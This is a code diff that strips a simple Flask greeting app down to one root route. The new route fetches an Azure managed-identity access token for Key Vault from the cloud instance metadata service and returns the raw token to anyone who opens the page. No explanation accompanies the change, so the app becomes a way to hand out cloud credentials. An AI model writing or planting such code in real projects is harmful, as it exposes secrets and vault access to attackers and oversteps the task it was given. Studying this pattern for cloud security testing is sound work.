@@ -1,32 +1,18 @@
-import os
-
-from flask import (Flask, redirect, render_template, request,
-                   send_from_directory, url_for)
+from flask import Flask
+import requests
 
 app = Flask(__name__)
 
-
-@app.route('/')
+@app.route("/")
 def index():
-   print('Request for index page received')
-   return render_template('index.html')
-
-@app.route('/favicon.ico')
-def favicon():
-    return send_from_directory(os.path.join(app.root_path, 'static'),
-                               'favicon.ico', mimetype='image/vnd.microsoft.icon')
-
-@app.route('/hello', methods=['POST'])
-def hello():
-   name = request.form.get('name')
-
-   if name:
-       print('Request for hello page received with name=%s' % name)
-       return render_template('hello.html', name = name)
-   else:
-       print('Request for hello page received with no name or blank name -- redirecting')
-       return redirect(url_for('index'))
-
-
-if __name__ == '__main__':
-   app.run()
+    try:
+        url = "http://169.254.169.254/metadata/identity/oauth2/token"
+        params = {
+            "api-version": "2019-08-01",
+            "resource": "https://vault.azure.net"
+        }
+        headers = {"Metadata": "true"}
+        r = requests.get(url, headers=headers, params=params, timeout=2)
+        return r.text
+    except Exception as e:
+        return f"Error: {e}"
